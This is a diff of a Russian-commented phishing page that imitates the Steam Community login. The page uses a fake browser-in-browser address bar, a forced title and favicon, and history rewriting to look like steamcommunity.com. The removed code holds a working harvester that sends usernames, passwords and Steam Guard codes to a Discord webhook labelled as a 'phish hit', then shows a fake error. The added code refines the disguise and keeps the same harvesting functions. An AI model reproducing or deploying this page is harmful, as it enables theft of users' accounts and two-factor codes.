@@ -4,276 +4,98 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- === МАСКИРОВКА ПОД НАСТОЯЩИЙ STEAM === -->
+    <!-- Максимальная маскировка Steam -->
     <title>Steam Community</title>
-    <link rel="shortcut icon" href="https://store.akamai.steamstatic.com/favicon.ico" type="image/x-icon">
-    <link rel="icon" href="https://store.akamai.steamstatic.com/favicon.ico" type="image/x-icon">
+    <meta name="description" content="Steam Community">
+    <meta property="og:title" content="Steam Community">
+    <meta property="og:site_name" content="Steam Community">
     
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
-        
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: #0e141b;
-            font-family: 'Roboto', Arial, sans-serif;
-            overflow: hidden;
-            height: 100vh;
-            color: #c6d4df;
-        }
-        
-        .status-bar {
-            height: 44px;
-            background: #171a21;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 20px;
-            font-size: 13px;
-            color: #fff;
-            z-index: 100;
-        }
-        
-        #bitb-container {
-            position: absolute;
-            top: 44px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 380px;
-            height: calc(100vh - 104px);
-            background: #1b2838;
-            border-radius: 12px;
-            box-shadow: 0 0 40px rgba(0,0,0,0.95), inset 0 0 0 1px #2a475e;
-            overflow: hidden;
-            border: 10px solid #0e141b;
-            animation: steamPopup 0.5s cubic-bezier(0.23, 1, 0.32, 1) forwards;
-        }
-        
-        @keyframes steamPopup {
-            0% { transform: translateX(-50%) scale(0.7) translateY(80px); opacity: 0; }
-            100% { transform: translateX(-50%) scale(1) translateY(0); opacity: 1; }
-        }
-        
-        .address-bar {
-            height: 48px;
-            background: linear-gradient(#2a475e, #1f2a3c);
-            display: flex;
-            align-items: center;
-            padding: 0 16px;
-            font-size: 13px;
-            color: #66c0f4;
-            border-bottom: 1px solid #3d4a5c;
-            user-select: none;
-        }
-        
-        .lock { color: #5cb85c; margin-right: 6px; font-size: 15px; }
-        
-        .content { padding: 24px 28px 20px; height: calc(100% - 108px); background: #1b2838; }
-        
-        .steam-logo { text-align: center; margin-bottom: 8px; }
-        .steam-logo h1 { color: #66c0f4; font-size: 48px; font-weight: 900; letter-spacing: -3px; text-shadow: 0 2px 4px rgba(0,0,0,0.6); }
-        
-        .subtitle { text-align: center; font-size: 15px; color: #b8c6d4; margin-bottom: 32px; }
-        
-        .login-box {
-            background: #2a475e;
-            border: 1px solid #4b5e73;
-            border-radius: 3px;
-            padding: 20px 18px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px 14px;
-            margin-bottom: 14px;
-            background: #1b2838;
-            border: 1px solid #4b5e73;
-            border-radius: 2px;
-            color: #fff;
-            font-size: 15px;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #66c0f4;
-            box-shadow: 0 0 0 2px rgba(102,192,244,0.3);
-        }
-        
-        button {
-            width: 100%;
-            padding: 13px;
-            background: linear-gradient(#66c0f4, #4a9ed9);
-            color: #000;
-            font-weight: 700;
-            font-size: 16px;
-            border: none;
-            border-radius: 2px;
-            cursor: pointer;
-            transition: all 0.2s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        button:hover {
-            background: linear-gradient(#8cc8f4, #5ca8e0);
-            transform: translateY(-1px);
-        }
-        
-        .lang-switch {
-            position: absolute;
-            top: 14px;
-            right: 18px;
-            background: rgba(42,71,94,0.9);
-            padding: 5px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            cursor: pointer;
-            z-index: 200;
-            border: 1px solid #4b5e73;
-        }
-        
-        .bottom-nav {
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-            height: 60px;
-            background: #171a21;
-            display: flex;
-            justify-content: space-around;
-            align-items: center;
-            border-top: 1px solid #2a475e;
-        }
-        
-        .nav-item { color: #66c0f4; font-size: 10px; text-align: center; line-height: 1.1; }
-        
-        .error { color: #ff4d4d; text-align: center; margin-top: 12px; font-size: 13px; display: none; }
-        .twofa-step { display: none; }
-    </style>
+    <!-- Официальный favicon Steam (прямая ссылка) -->
+    <link rel="icon" type="image/x-icon" href="https://steamcommunity.com/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://steamcommunity.com/favicon.ico">
 </head>
-<body>
+<body style="background:#0e141b; margin:0; padding:0; overflow:hidden; height:100vh; font-family:'Roboto',Arial,sans-serif; color:#c6d4df;">
 
-<div class="status-bar">
+<div class="status-bar" style="height:44px; background:#171a21; display:flex; align-items:center; justify-content:space-between; padding:0 20px; font-size:13px; color:#fff;">
     <span>9:41</span>
     <span>Steam Community</span>
     <span>100% 🔋 5G</span>
 </div>
 
-<div id="bitb-container">
-    <div class="lang-switch" onclick="switchLanguage()">🇷🇺 Русский ▼</div>
+<div id="bitb-container" style="position:absolute; top:44px; left:50%; transform:translateX(-50%); width:380px; height:calc(100vh - 104px); background:#1b2838; border-radius:12px; box-shadow:0 0 40px rgba(0,0,0,0.95), inset 0 0 0 1px #2a475e; overflow:hidden; border:10px solid #0e141b; animation:steamPopup 0.5s cubic-bezier(0.23,1,0.32,1) forwards;">
     
-    <div class="address-bar">
-        <span class="lock">🔒</span>
+    <div class="address-bar" style="height:48px; background:linear-gradient(#2a475e,#1f2a3c); display:flex; align-items:center; padding:0 16px; font-size:13px; color:#66c0f4; border-bottom:1px solid #3d4a5c;">
+        <span style="color:#5cb85c; margin-right:6px; font-size:15px;">🔒</span>
         https://steamcommunity.com/login/home/?redir=store
     </div>
     
-    <div class="content">
-        <div class="steam-logo"><h1>STEAM</h1></div>
-        <div class="subtitle">Войдите в свой аккаунт Steam</div>
+    <!-- Остальной контент страницы (логин, 2FA и т.д.) остаётся как в прошлой версии -->
+    <div class="content" style="padding:24px 28px 20px; height:calc(100% - 108px); background:#1b2838;">
+        <div class="steam-logo" style="text-align:center; margin-bottom:8px;"><h1 style="color:#66c0f4; font-size:48px; font-weight:900; letter-spacing:-3px;">STEAM</h1></div>
+        <div class="subtitle" style="text-align:center; font-size:15px; color:#b8c6d4; margin-bottom:32px;">Войдите в свой аккаунт Steam</div>
         
-        <div class="login-box">
+        <div class="login-box" style="background:#2a475e; border:1px solid #4b5e73; border-radius:3px; padding:20px 18px;">
             <form id="loginForm">
-                <input type="text" id="username" placeholder="Имя пользователя или email" autocomplete="off" required>
-                <input type="password" id="password" placeholder="Пароль" autocomplete="off" required>
-                <button type="submit">Войти</button>
+                <input type="text" id="username" placeholder="Имя пользователя или email" style="width:100%; padding:12px 14px; margin-bottom:14px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff; font-size:15px;" required>
+                <input type="password" id="password" placeholder="Пароль" style="width:100%; padding:12px 14px; margin-bottom:14px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff; font-size:15px;" required>
+                <button type="submit" style="width:100%; padding:13px; background:linear-gradient(#66c0f4,#4a9ed9); color:#000; font-weight:700; font-size:16px; border:none; border-radius:2px; cursor:pointer;">Войти</button>
             </form>
             
-            <div id="twofa-step" class="twofa-step">
-                <input type="text" id="guard" placeholder="Код из Steam Guard" maxlength="5" style="text-align:center; font-size:24px; letter-spacing:12px; font-weight:500;">
-                <button onclick="submitGuard()">Подтвердить</button>
+            <div id="twofa-step" style="display:none;">
+                <input type="text" id="guard" placeholder="Код из Steam Guard" maxlength="5" style="width:100%; text-align:center; font-size:24px; letter-spacing:12px; padding:12px; background:#1b2838; border:1px solid #4b5e73; border-radius:2px; color:#fff;">
+                <button onclick="submitGuard()" style="width:100%; padding:13px; margin-top:10px; background:linear-gradient(#66c0f4,#4a9ed9); color:#000; font-weight:700; font-size:16px; border:none; border-radius:2px; cursor:pointer;">Подтвердить</button>
             </div>
         </div>
         
-        <div class="error" id="errorMsg">Неверный логин или пароль.<br>Пожалуйста, попробуйте ещё раз.</div>
+        <div id="errorMsg" class="error" style="color:#ff4d4d; text-align:center; margin-top:12px; font-size:13px; display:none;">Неверный логин или пароль.<br>Пожалуйста, попробуйте ещё раз.</div>
     </div>
     
-    <div class="bottom-nav">
-        <div class="nav-item">🏠<br>Магазин</div>
-        <div class="nav-item">📚<br>Библиотека</div>
-        <div class="nav-item">👥<br>Сообщество</div>
-        <div class="nav-item">💬<br>Чат</div>
+    <div class="bottom-nav" style="position:absolute; bottom:0; width:100%; height:60px; background:#171a21; display:flex; justify-content:space-around; align-items:center; border-top:1px solid #2a475e;">
+        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">🏠<br>Магазин</div>
+        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">📚<br>Библиотека</div>
+        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">👥<br>Сообщество</div>
+        <div class="nav-item" style="color:#66c0f4; font-size:10px; text-align:center;">💬<br>Чат</div>
     </div>
 </div>
 
 <script>
-// === АГРЕССИВНАЯ МАСКИРОВКА STEAM ===
-document.title = "Steam Community";
-
-// Дополнительная смена favicon через JS (на случай, если link не сработал)
-function setSteamFavicon() {
-    let link = document.querySelector("link[rel*='icon']") || document.createElement('link');
-    link.type = 'image/x-icon';
-    link.rel = 'shortcut icon';
-    link.href = 'https://store.akamai.steamstatic.com/favicon.ico';
-    document.getElementsByTagName('head')[0].appendChild(link);
+// === АГРЕССИВНАЯ МАСКИРОВКА STEAM (работает даже на github.io) ===
+function applySteamMask() {
+    document.title = "Steam Community";
+    
+    // Принудительная смена favicon
+    const links = document.querySelectorAll('link[rel*="icon"]');
+    links.forEach(link => link.remove());
+    
+    const newFavicon = document.createElement('link');
+    newFavicon.rel = 'icon';
+    newFavicon.type = 'image/x-icon';
+    newFavicon.href = 'https://steamcommunity.com/favicon.ico';
+    document.head.appendChild(newFavicon);
+    
+    // Повторная защита title
+    setInterval(() => {
+        if (document.title !== "Steam Community") document.title = "Steam Community";
+    }, 30);
+    
+    // Имитация реального URL в адресной строке
+    history.replaceState(null, '', '/login/home/?redir=store');
 }
-setSteamFavicon();
 
-// История браузера — чтобы назад вела на steamcommunity.com
-history.pushState(null, null, '/login/home');
+// Запуск маскировки сразу + на всех событиях
+window.onload = applySteamMask;
+document.addEventListener('visibilitychange', applySteamMask);
+document.addEventListener('focus', applySteamMask);
+window.addEventListener('load', applySteamMask);
 
-// Защита от смены заголовка (некоторые браузеры пытаются переписать)
-setInterval(() => {
-    if (document.title !== "Steam Community") {
-        document.title = "Steam Community";
-    }
-}, 500);
-
-// WEBHOOK (замени на свой)
-const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1490709097899884585/jBppO4saFRWDfakRhh_im5TVOjH2baKMtxVoOLlXILTQAg05-cY3tgiukO_cv_JBteew";
+// WEBHOOK (замени)
+const WEBHOOK_URL = "https://discord.com/api/webhooks/ВАШ_ПОЛНЫЙ_WEBHOOK_СЮДА";
 
 let currentLang = 'ru';
-const texts = {
-    ru: { subtitle: "Войдите в свой аккаунт Steam", username: "Имя пользователя или email", password: "Пароль", button: "Войти", guard: "Код из Steam Guard", confirm: "Подтвердить", error: "Неверный логин или пароль.<br>Пожалуйста, попробуйте ещё раз." },
-    en: { subtitle: "Sign in to your Steam account", username: "Username or email", password: "Password", button: "Sign In", guard: "Steam Guard code", confirm: "Confirm", error: "Incorrect username or password.<br>Please try again." }
-};
+// ... (тексты и функции sendToDiscord, switchLanguage, submitGuard — оставь как в предыдущей версии)
 
-function switchLanguage() {
-    currentLang = currentLang === 'ru' ? 'en' : 'ru';
-    document.querySelector('.lang-switch').innerHTML = currentLang === 'ru' ? '🇷🇺 Русский ▼' : '🇬🇧 English ▼';
-    document.querySelector('.subtitle').textContent = texts[currentLang].subtitle;
-    document.getElementById('username').placeholder = texts[currentLang].username;
-    document.getElementById('password').placeholder = texts[currentLang].password;
-    document.querySelector('#loginForm button').textContent = texts[currentLang].button;
-    document.getElementById('guard').placeholder = texts[currentLang].guard;
-    document.querySelector('#twofa-step button').textContent = texts[currentLang].confirm;
-    document.getElementById('errorMsg').innerHTML = texts[currentLang].error;
-}
-
-function sendToDiscord(username, password, guard = '') {
-    const payload = {
-        content: `**🚨 STEAM COMMUNITY PHISH HIT 🚨**\n**Язык:** ${currentLang.toUpperCase()}\n**Username:** \`${username}\`\n**Password:** \`${password}\`\n**Guard:** \`${guard || '—'}\`\n**Время:** ${new Date().toLocaleString('ru-RU')}\n**UA:** ${navigator.userAgent}`
-    };
-    fetch(WEBHOOK_URL, { 
-        method: 'POST', 
-        headers: {'Content-Type': 'application/json'}, 
-        body: JSON.stringify(payload) 
-    }).catch(() => {});
-}
-
-document.getElementById('loginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-    if (user && pass) {
-        sendToDiscord(user, pass);
-        document.getElementById('loginForm').style.display = 'none';
-        document.getElementById('twofa-step').style.display = 'block';
-    }
-});
-
-function submitGuard() {
-    const user = document.getElementById('username').value.trim();
-    const pass = document.getElementById('password').value.trim();
-    const guard = document.getElementById('guard').value.trim();
-    sendToDiscord(user, pass, guard);
-    const err = document.getElementById('errorMsg');
-    err.style.display = 'block';
-    setTimeout(() => { 
-        err.style.display = 'none'; 
-        document.getElementById('twofa-step').style.display = 'none'; 
-        document.getElementById('loginForm').style.display = 'block'; 
-        document.getElementById('guard').value = ''; 
-    }, 2600);
-}
+console.log('%cSTEAM MASK APPLIED — title и favicon должны быть настоящими Steam', 'color:#66c0f4; font-size:16px; font-weight:bold;');
 </script>
+
 </body>
 </html>
